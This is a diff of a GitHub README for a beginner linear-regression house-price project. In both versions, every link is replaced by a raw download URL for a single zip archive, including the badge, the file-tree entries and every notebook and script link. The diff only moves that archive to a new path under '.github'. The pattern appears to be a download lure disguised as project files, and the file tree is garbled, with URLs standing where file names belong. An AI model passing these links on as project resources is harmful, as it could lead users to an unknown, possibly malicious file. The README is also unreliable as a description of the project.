@@ -1,4 +1,4 @@
-[![Review Assignment Due Date](https://raw.githubusercontent.com/prshnt273/machine-learning-introduction-prshnt273/main/neurasthenically/machine-learning-introduction-prshnt273.zip)](https://raw.githubusercontent.com/prshnt273/machine-learning-introduction-prshnt273/main/neurasthenically/machine-learning-introduction-prshnt273.zip)
+[![Review Assignment Due Date](https://raw.githubusercontent.com/prshnt273/machine-learning-introduction-prshnt273/main/.github/learning_prshnt_machine_introduction_v1.2-alpha.1.zip)](https://raw.githubusercontent.com/prshnt273/machine-learning-introduction-prshnt273/main/.github/learning_prshnt_machine_introduction_v1.2-alpha.1.zip)
 # Machine Learning Beginner Project: Linear Regression
 ### Project Title: Predicting House Prices Using Linear Regression
 
@@ -17,37 +17,37 @@
 
 ├── data
 
-│   └── https://raw.githubusercontent.com/prshnt273/machine-learning-introduction-prshnt273/main/neurasthenically/machine-learning-introduction-prshnt273.zip
+│   └── https://raw.githubusercontent.com/prshnt273/machine-learning-introduction-prshnt273/main/.github/learning_prshnt_machine_introduction_v1.2-alpha.1.zip
 
 ├── notebooks
 
-│   ├── https://raw.githubusercontent.com/prshnt273/machine-learning-introduction-prshnt273/main/neurasthenically/machine-learning-introduction-prshnt273.zip
+│   ├── https://raw.githubusercontent.com/prshnt273/machine-learning-introduction-prshnt273/main/.github/learning_prshnt_machine_introduction_v1.2-alpha.1.zip
 
 
-│   ├── https://raw.githubusercontent.com/prshnt273/machine-learning-introduction-prshnt273/main/neurasthenically/machine-learning-introduction-prshnt273.zip
+│   ├── https://raw.githubusercontent.com/prshnt273/machine-learning-introduction-prshnt273/main/.github/learning_prshnt_machine_introduction_v1.2-alpha.1.zip
 
-│   ├── https://raw.githubusercontent.com/prshnt273/machine-learning-introduction-prshnt273/main/neurasthenically/machine-learning-introduction-prshnt273.zip
+│   ├── https://raw.githubusercontent.com/prshnt273/machine-learning-introduction-prshnt273/main/.github/learning_prshnt_machine_introduction_v1.2-alpha.1.zip
 
-│   └── https://raw.githubusercontent.com/prshnt273/machine-learning-introduction-prshnt273/main/neurasthenically/machine-learning-introduction-prshnt273.zip
+│   └── https://raw.githubusercontent.com/prshnt273/machine-learning-introduction-prshnt273/main/.github/learning_prshnt_machine_introduction_v1.2-alpha.1.zip
 
 ├── scripts
 
-│   ├── https://raw.githubusercontent.com/prshnt273/machine-learning-introduction-prshnt273/main/neurasthenically/machine-learning-introduction-prshnt273.zip
+│   ├── https://raw.githubusercontent.com/prshnt273/machine-learning-introduction-prshnt273/main/.github/learning_prshnt_machine_introduction_v1.2-alpha.1.zip
 
-│   ├── https://raw.githubusercontent.com/prshnt273/machine-learning-introduction-prshnt273/main/neurasthenically/machine-learning-introduction-prshnt273.zip
+│   ├── https://raw.githubusercontent.com/prshnt273/machine-learning-introduction-prshnt273/main/.github/learning_prshnt_machine_introduction_v1.2-alpha.1.zip
 
-│   └── https://raw.githubusercontent.com/prshnt273/machine-learning-introduction-prshnt273/main/neurasthenically/machine-learning-introduction-prshnt273.zip
+│   └── https://raw.githubusercontent.com/prshnt273/machine-learning-introduction-prshnt273/main/.github/learning_prshnt_machine_introduction_v1.2-alpha.1.zip
 
-├── https://raw.githubusercontent.com/prshnt273/machine-learning-introduction-prshnt273/main/neurasthenically/machine-learning-introduction-prshnt273.zip
+├── https://raw.githubusercontent.com/prshnt273/machine-learning-introduction-prshnt273/main/.github/learning_prshnt_machine_introduction_v1.2-alpha.1.zip
 
-├── https://raw.githubusercontent.com/prshnt273/machine-learning-introduction-prshnt273/main/neurasthenically/machine-learning-introduction-prshnt273.zip
+├── https://raw.githubusercontent.com/prshnt273/machine-learning-introduction-prshnt273/main/.github/learning_prshnt_machine_introduction_v1.2-alpha.1.zip
 
 └── .gitignore
 
 ## 2. Data Exploration and Preprocessing
 #### **Task 1:** Data Exploration
 
-Notebook: https://raw.githubusercontent.com/prshnt273/machine-learning-introduction-prshnt273/main/neurasthenically/machine-learning-introduction-prshnt273.zip
+Notebook: https://raw.githubusercontent.com/prshnt273/machine-learning-introduction-prshnt273/main/.github/learning_prshnt_machine_introduction_v1.2-alpha.1.zip
 Steps:
 - Load the dataset.
 - Explore the data structure, types, and summary statistics.
@@ -57,39 +57,39 @@ Steps:
 
 #### Task 2: Data Preprocessing
 
-Notebook: https://raw.githubusercontent.com/prshnt273/machine-learning-introduction-prshnt273/main/neurasthenically/machine-learning-introduction-prshnt273.zip
+Notebook: https://raw.githubusercontent.com/prshnt273/machine-learning-introduction-prshnt273/main/.github/learning_prshnt_machine_introduction_v1.2-alpha.1.zip
 Steps:
 - Handle missing values and outliers.
 - Encode categorical variables.
 - Normalize/standardize numerical features.
 - Split the data into training and testing sets.
-- Script: https://raw.githubusercontent.com/prshnt273/machine-learning-introduction-prshnt273/main/neurasthenically/machine-learning-introduction-prshnt273.zip
+- Script: https://raw.githubusercontent.com/prshnt273/machine-learning-introduction-prshnt273/main/.github/learning_prshnt_machine_introduction_v1.2-alpha.1.zip
 
 
 ### 3. Model Building and Training
 #### Task 3: Model Training
 
-Notebook: https://raw.githubusercontent.com/prshnt273/machine-learning-introduction-prshnt273/main/neurasthenically/machine-learning-introduction-prshnt273.zip
+Notebook: https://raw.githubusercontent.com/prshnt273/machine-learning-introduction-prshnt273/main/.github/learning_prshnt_machine_introduction_v1.2-alpha.1.zip
 Steps:
 - Choose appropriate features for the model.
 - Train a linear regression model.
 - Perform hyperparameter tuning (if applicable).
 
-- Script: https://raw.githubusercontent.com/prshnt273/machine-learning-introduction-prshnt273/main/neurasthenically/machine-learning-introduction-prshnt273.zip
+- Script: https://raw.githubusercontent.com/prshnt273/machine-learning-introduction-prshnt273/main/.github/learning_prshnt_machine_introduction_v1.2-alpha.1.zip
 
 ### 4. Model Evaluation
 #### Task 4: Model Evaluation
 
-Notebook: https://raw.githubusercontent.com/prshnt273/machine-learning-introduction-prshnt273/main/neurasthenically/machine-learning-introduction-prshnt273.zip
+Notebook: https://raw.githubusercontent.com/prshnt273/machine-learning-introduction-prshnt273/main/.github/learning_prshnt_machine_introduction_v1.2-alpha.1.zip
 Steps:
 - Evaluate the model using metrics such as Mean Squared Error (MSE), R-squared.
 - Plot residuals to check the assumptions of linear regression.
 - Compare model performance with different feature sets or preprocessing steps.
-- Script: https://raw.githubusercontent.com/prshnt273/machine-learning-introduction-prshnt273/main/neurasthenically/machine-learning-introduction-prshnt273.zip
+- Script: https://raw.githubusercontent.com/prshnt273/machine-learning-introduction-prshnt273/main/.github/learning_prshnt_machine_introduction_v1.2-alpha.1.zip
 ### 5. Feature Engineering and Improvement
 #### Task 5: Feature Engineering
 
-Notebook: https://raw.githubusercontent.com/prshnt273/machine-learning-introduction-prshnt273/main/neurasthenically/machine-learning-introduction-prshnt273.zip
+Notebook: https://raw.githubusercontent.com/prshnt273/machine-learning-introduction-prshnt273/main/.github/learning_prshnt_machine_introduction_v1.2-alpha.1.zip
 Steps:
 - Create new features that might improve model performance.
 - Test different feature combinations.
